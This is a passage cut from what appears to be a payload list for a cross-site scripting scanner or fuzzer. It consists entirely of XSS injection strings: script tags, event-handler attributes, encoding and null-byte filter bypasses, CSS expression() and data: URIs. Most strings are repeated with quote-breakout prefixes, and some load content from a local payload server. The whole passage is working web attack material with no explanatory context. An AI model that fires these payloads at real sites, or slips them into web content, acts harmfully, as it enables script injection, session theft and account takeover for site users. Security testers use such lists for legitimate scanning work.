             "</ScrIpt><script>alert(\\'\\\\\\\\1\\\\\\\\\\')</script>",
             "<script>alert(\\'\\\\/\\\\1\\\\/\\\\\\')</script>",
             "</ScrIpt><script>alert(\\'\\\\/\\\\1\\\\/\\\\\\')</script>",
             '"><script>alert(\\\'\\\\/\\\\1\\\\/\\\\\\\')</script>',
             "</ScrIpt><script>alert(\\'\\\\/\\\\1\\\\/\\\\\\')</script>",
             "'><script>alert(\\'\\\\/\\\\1\\\\/\\\\\\')</script>",
             "</ScrIpt><script>alert(\\'\\\\/\\\\1\\\\/\\\\\\')</script>", '\\\'\\\'\\">',
             '<scri%00pt>alert(1);</scri%00pt>', '"><scri%00pt>alert(1);</scri%00pt>',
             "'><scri%00pt>alert(1);</scri%00pt>", '<scri\\x00pt>alert(1);</scri%00pt>',
             '"><scri\\x00pt>alert(1);</scri%00pt>', "'><scri\\x00pt>alert(1);</scri%00pt>",
             '<s%00c%00r%00%00ip%00t>confirm(1);</s%00c%00r%00%00ip%00t>',
             '"><s%00c%00r%00%00ip%00t>confirm(1);</s%00c%00r%00%00ip%00t>',
             "'><s%00c%00r%00%00ip%00t>confirm(1);</s%00c%00r%00%00ip%00t>", '<script>alert(1);</script>',
             '</ScrIpt><script>alert(1);</script>', '"><script>alert(1);</script>',
             '</ScrIpt><script>alert(1);</script>', "'><script>alert(1);</script>",
             '</ScrIpt><script>alert(1);</script>', '<%0ascript>alert(1);</script>', '"><%0ascript>alert(1);</script>',
             "'><%0ascript>alert(1);</script>", '<%0bscript>alert(1);</script>', '"><%0bscript>alert(1);</script>',
             "'><%0bscript>alert(1);</script>", '<SCRIPT> alert(\\"1\\");</SCRIPT>',
             '</ScrIpt><SCRIPT> alert(\\"1\\");</SCRIPT>', '"><SCRIPT> alert(\\"1\\");</SCRIPT>',
             '</ScrIpt><SCRIPT> alert(\\"1\\");</SCRIPT>', '\'><SCRIPT> alert(\\"1\\");</SCRIPT>',
             '</ScrIpt><SCRIPT> alert(\\"1\\");</SCRIPT>', '<SCRIPT> alert(\\"1\\")</SCRIPT>',
             '</ScrIpt><SCRIPT> alert(\\"1\\")</SCRIPT>', '"><SCRIPT> alert(\\"1\\")</SCRIPT>',
             '</ScrIpt><SCRIPT> alert(\\"1\\")</SCRIPT>', '\'><SCRIPT> alert(\\"1\\")</SCRIPT>',
             '</ScrIpt><SCRIPT> alert(\\"1\\")</SCRIPT>', '<script>alert([!![]] [])</script>',
             '</ScrIpt><script>alert([!![]] [])</script>', '"><script>alert([!![]] [])</script>',
             '</ScrIpt><script>alert([!![]] [])</script>', "'><script>alert([!![]] [])</script>",
             '</ScrIpt><script>alert([!![]] [])</script>', '<var onmouseover="prompt(1)">X</var>',
             '"><var onmouseover="prompt(1)">X</var>', '\'><var onmouseover="prompt(1)">X</var>',
             '%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80?',
             '<input type="text" value=``<div/onmouseover=\'alert(1)\'>X</div>',
             '"><input type="text" value=``<div/onmouseover=\'alert(1)\'>X</div>',
             '\'><input type="text" value=``<div/onmouseover=\'alert(1)\'>X</div>',
             '<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?',
             '"><iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?',
             "'><iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?",
             '<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>',
             '"><iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>',
             "'><iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>",
             '<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>',
             '"><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>',
             '\'><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?',
             '"><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>',
             '"><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>',
             '\'><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?',
             '\'><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>',
             '"><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>',
             '\'><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?',
             '<embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>',
             '"><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>',
             '\'><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>?',
             '"><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>?',
             '\'><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>?',
             "<script>~'\\u0061' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+",
             "</ScrIpt><script>~'\\u0061' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+",
             '"><script>~\'\\u0061\' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~\'\\u0061\')</script U+',
             "</ScrIpt><script>~'\\u0061' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+",
             "'><script>~'\\u0061' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+",
             "</ScrIpt><script>~'\\u0061' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+",
             '<script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script',
             '"><script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script',
             "'><script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script ????????????",
             '"><script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script',
             '"><script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script',
             "'><script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script ????????????",
             "'><script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script",
             '"><script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script',
             "'><script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script ????????????",
             '<script itworksinallbrowsers>/*<script* */alert(1)</script',
             '"><script itworksinallbrowsers>/*<script* */alert(1)</script',
             "'><script itworksinallbrowsers>/*<script* */alert(1)</script ?",
             '"><script itworksinallbrowsers>/*<script* */alert(1)</script ?',
             "'><script itworksinallbrowsers>/*<script* */alert(1)</script ?",
             '<img src ?itworksonchrome?\\/onerror = alert(1)', '"><img src ?itworksonchrome?\\/onerror = alert(1)',
             "'><img src ?itworksonchrome?\\/onerror = alert(1)???",
             '"><img src ?itworksonchrome?\\/onerror = alert(1)???',
             "'><img src ?itworksonchrome?\\/onerror = alert(1)???",
             '<meta http-equiv="refresh" content="0; url=data:text/html;blabla,&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
             '"><meta http-equiv="refresh" content="0; url=data:text/html;blabla,&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
             '\'><meta http-equiv="refresh" content="0; url=data:text/html;blabla,&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
             '<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe',
             '"><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe',
             "'><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe",
             '<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>',
             '"><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>',
             "'><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?",
             '"><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>',
             '"><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>',
             "'><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?",
             "'><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",
             '"><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>',
             "'><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?",
             '<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?',
             '"><div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?',
             '\'><div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?',
             '<img src=x onerror=window.open(\'http://127.0.0.1:3555/xss_serve_payloads/X.html"\');>',
             '"><img src=x onerror=window.open(\'http://127.0.0.1:3555/xss_serve_payloads/X.html"\');>',
             '\'><img src=x onerror=window.open(\'http://127.0.0.1:3555/xss_serve_payloads/X.html"\');>',
             '<table background=javascript:alert(1)></table>', '"><table background=javascript:alert(1)></table>',
             "'><table background=javascript:alert(1)></table>",
             '<object/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf',
             '"><object/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf',
             "'><object/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf", '<applet code="javascript:confirm(1);">',
             '"><applet code="javascript:confirm(1);">', '\'><applet code="javascript:confirm(1);">',
             '<marquee/onstart=confirm(2)>/', '"><marquee/onstart=confirm(2)>/', "'><marquee/onstart=confirm(2)>/",
             '<body onload=prompt(1);>', '"><body onload=prompt(1);>', "'><body onload=prompt(1);>",
             '<select autofocus onfocus=alert(1)>', '"><select autofocus onfocus=alert(1)>',
             "'><select autofocus onfocus=alert(1)>", '<textarea autofocus onfocus=alert(1)>',
             '"><textarea autofocus onfocus=alert(1)>', "'><textarea autofocus onfocus=alert(1)>",
             '<keygen autofocus onfocus=alert(1)>', '"><keygen autofocus onfocus=alert(1)>',
             "'><keygen autofocus onfocus=alert(1)>", '<video><source onerror="javascript:alert(1)">',
             '"><video><source onerror="javascript:alert(1)">', '\'><video><source onerror="javascript:alert(1)">',
             '<a onmouseover="javascript:window.onerror=alert;throw 1>',
             '"><a onmouseover="javascript:window.onerror=alert;throw 1>',
             '\'><a onmouseover="javascript:window.onerror=alert;throw 1>',
             '<img src=x onerror="javascript:window.onerror=alert;throw 1">',
             '"><img src=x onerror="javascript:window.onerror=alert;throw 1">',
             '\'><img src=x onerror="javascript:window.onerror=alert;throw 1">',
             "<body/onload=javascript:window.onerror=eval;throw'=alert\\x281\\x29';",
             '"><body/onload=javascript:window.onerror=eval;throw\'=alert\\x281\\x29\';',
             "'><body/onload=javascript:window.onerror=eval;throw'=alert\\x281\\x29';",
             '<img style="xss:expression(alert(1))">', '"><img style="xss:expression(alert(1))">',
             '\'><img style="xss:expression(alert(1))">',
             '<div style="color:rgb(\'\'&#0;x:expression(alert(1))"></div>',
             '"><div style="color:rgb(\'\'&#0;x:expression(alert(1))"></div>',
             '\'><div style="color:rgb(\'\'&#0;x:expression(alert(1))"></div>',
             '<a onmouseover=location=?javascript:alert(1)>click',
             '"><a onmouseover=location=?javascript:alert(1)>click',
             "'><a onmouseover=location=?javascript:alert(1)>click",
             '<body onfocus="location=\'javascrpt:alert(1) >123', '"><body onfocus="location=\'javascrpt:alert(1) >123',
             '\'><body onfocus="location=\'javascrpt:alert(1) >123',
             '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>',
             '"><svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>',
             '\'><svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>',
             '<svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(1)//"></svg>',
             '"><svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(1)//"></svg>',
             '\'><svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(1)//"></svg>',
             '<meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
             '"><meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
             '\'><meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
             '<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:\\u0061lert(1);"></g></svg>',
             '"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:\\u0061lert(1);"></g></svg>',
             '\'><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:\\u0061lert(1);"></g></svg>',
             '<style>#test{x:expression(alert(/X/))}</style>', '"><style>#test{x:expression(alert(/X/))}</style>',
             "'><style>#test{x:expression(alert(/X/))}</style>",
             '<object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>',
             '"><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>',
             "'><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>?",
             '"><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>?',
             "'><object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==></object>?",
             '<meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">',
             '"><meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">',
             '\'><meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">',
             'eval("s=document.createElement(\'script\');alert(1);document.getElementsByTagName(\'head\')[0].appendChild(s)")',
             '<meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html"',
             '"><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html"',
             '\'><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html"',
             '<meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html"',
             '"><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html"',
             '\'><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html">',
             '"><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html">',
             '\'><meta http-equiv="refresh" content="0;url=http://127.0.0.1:3555/xss_serve_payloads/X.html">',
             'javascript:/*?></marquee></script></title></textarea></noscript></style></xmp>?> [img=1]<img -/style=-=expression&#40/*?/-/*\',/**/eval(name)//);wi dth:100%;height:100%;position:absolute;behavior:url(#default#VML);-o-link:javascript :eval(title);-o-link-source:current name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) background=javascript:eval(name)//>?"/>',
             '<img src=?<img src=x?/onerror=alert(1)//?> Jquery: <img/src/onerror=alert(1)>',
             '"><img src=?<img src=x?/onerror=alert(1)//?> Jquery: <img/src/onerror=alert(1)>',
             "'><img src=?<img src=x?/onerror=alert(1)//?> Jquery: <img/src/onerror=alert(1)>",
             '<input id=x><input id=x><script>alert(x)</script>', '"><input id=x><input id=x><script>alert(x)</script>',
             "'><input id=x><input id=x><script>alert(x)</script>",
             '<a href="invalid:1" id=x name=y>test</a><a href="invalid:2" id=x name=y>test</a><script>alert(x.y[0])</script>',
             '"><a href="invalid:1" id=x name=y>test</a><a href="invalid:2" id=x name=y>test</a><script>alert(x.y[0])</script>',
             '\'><a href="invalid:1" id=x name=y>test</a><a href="invalid:2" id=x name=y>test</a><script>alert(x.y[0])</script>',
             '<script>alert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>',
             '</ScrIpt><script>alert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>',
             '"><script>alert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>',
             '</ScrIpt><script>alert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>',
             "'><script>alert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>",
             '</ScrIpt><script>alert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>',
             '<a href=1 name=x>test</a><a href=1 name=x>test</a><script>alert(x.removeChild)alert(x.parentNode)</script>',
             '"><a href=1 name=x>test</a><a href=1 name=x>test</a><script>alert(x.removeChild)alert(x.parentNode)</script>',
             "'><a href=1 name=x>test</a><a href=1 name=x>test</a><script>alert(x.removeChild)alert(x.parentNode)</script>",
             '<a href="123" id=x>test</a><script>x=\'javascript:alert(1)\';</script>',
             '"><a href="123" id=x>test</a><script>x=\'javascript:alert(1)\';</script>',
             '\'><a href="123" id=x>test</a><script>x=\'javascript:alert(1)\';</script>',
             '<form name=self location="javascript:alert(1)"', '"><form name=self location="javascript:alert(1)"',
             '\'><form name=self location="javascript:alert(1)">', '"><form name=self location="javascript:alert(1)"',
             '"><form name=self location="javascript:alert(1)"', '\'><form name=self location="javascript:alert(1)">',
             '\'><form name=self location="javascript:alert(1)"', '"><form name=self location="javascript:alert(1)"',
             '\'><form name=self location="javascript:alert(1)"></form><script>if(top!=self){top.location=self.location}</script>',
             '"><form name=self location="javascript:alert(1)"></form><script>if(top!=self){top.location=self.location}</script>',
             '\'><form name=self location="javascript:alert(1)"></form><script>if(top!=self){top.location=self.location}</script>',
             '<form name=self location="javascript&amp;#58;alert(1)"></form><script>if(top!=self){top.location=self.location}</script>',
             '"><form name=self location="javascript&amp;#58;alert(1)"></form><script>if(top!=self){top.location=self.location}</script>',
             '\'><form name=self location="javascript&amp;#58;alert(1)"></form><script>if(top!=self){top.location=self.location}</script>',
             '%3Cimg%20name%3DgetElementsByTagName%20src%3D1%20%20onerror%3Dalert(1)%3E',
             '%3Cform%20onmouseover%3Dalert(1)%3E%3Cinput%20name%3Dattributes%3E',
             "<a/onmouseover[\\x0b]=location='\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x31\\x29\\x3B'>X",
             '"><a/onmouseover[\\x0b]=location=\'\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x31\\x29\\x3B\'>X',
             "'><a/onmouseover[\\x0b]=location='\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x31\\x29\\x3B'>X",
             'data:text/html,%3Cscript%3Ealert(1)%3C%2Fscript%3E', 'window.name//\'name="javascript:alert("X")',
             '<svg/onload=location=/java/.source+/script/.source+location.h ash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.has h[3]//#:()',
             '"><svg/onload=location=/java/.source+/script/.source+location.h ash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.has h[3]//#:()',
             "'><svg/onload=location=/java/.source+/script/.source+location.h ash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.has h[3]//#:()",
             '<%div%20style=xss:expression(prompt(1))>', '"><%div%20style=xss:expression(prompt(1))>',
             "'><%div%20style=xss:expression(prompt(1))>", '%22]);}catch(e){}if(!self.a)self.a=!alert(1);/',
             '<script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>;',
             '</ScrIpt><script>alert(1)</script>;', '"><script>alert(1)</script>;',
             '</ScrIpt><script>alert(1)</script>;', "'><script>alert(1)</script>;",
             '</ScrIpt><script>alert(1)</script>;', '<script>alert("/X"/)</script>',
             '</ScrIpt><script>alert("/X"/)</script>', '"><script>alert("/X"/)</script>',
             '</ScrIpt><script>alert("/X"/)</script>', '\'><script>alert("/X"/)</script>',
             '</ScrIpt><script>alert("/X"/)</script>', '<SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/', '"><SCRIPT>a=/X/',
